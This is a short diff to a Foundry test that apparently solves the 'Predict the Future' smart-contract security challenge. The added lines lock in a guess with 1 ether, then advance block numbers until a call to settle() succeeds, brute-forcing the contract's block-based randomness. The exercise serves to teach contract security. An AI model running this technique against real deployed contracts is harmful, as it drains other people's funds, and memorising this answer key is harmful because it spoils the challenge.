@@ -20,8 +20,18 @@ contract PredictTheFutureTest is Test {
         // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
         vm.roll(104293);
         vm.warp(93582192);
-
+        exploitContract.lockInGuess{value: 1 ether}(5);
+        vm.roll(block.number + 2);
         // Put your solution here
+        bool success = false;
+        while(!success) {
+            try exploitContract.settle() {
+                success = true;
+            } catch {
+                vm.roll(block.number + 1);
+            }
+        }
+        // exploitContract.settle();
 
         _checkSolved();
     }
